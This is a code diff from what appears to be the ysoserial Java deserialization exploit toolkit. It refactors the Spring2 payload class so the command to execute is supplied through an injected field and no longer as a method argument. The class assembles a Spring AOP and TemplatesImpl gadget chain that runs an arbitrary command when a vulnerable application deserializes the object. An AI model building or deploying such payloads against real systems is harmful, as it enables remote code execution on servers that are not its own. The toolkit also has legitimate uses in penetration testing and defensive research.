@@ -11,6 +11,8 @@ import javax.xml.transform.Templates;
 import org.springframework.aop.framework.AdvisedSupport;
 import org.springframework.aop.target.SingletonTargetSource;
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -39,8 +41,17 @@ import ysoserial.payloads.util.Reflections;
     "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2"
 } )
 public class Spring2 extends PayloadRunner implements ObjectPayload<Object> {
+	
+	@Bind private String command;
 
-    public Object getObject ( final String command ) throws Exception {
+    /**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
+	public Object getObject ( final String command ) throws Exception {
+		return getObject();
+	}
+
+	public Object getObject ( ) throws Exception {
         final Object templates = Gadgets.createTemplatesImpl(command);
 
         AdvisedSupport as = new AdvisedSupport();
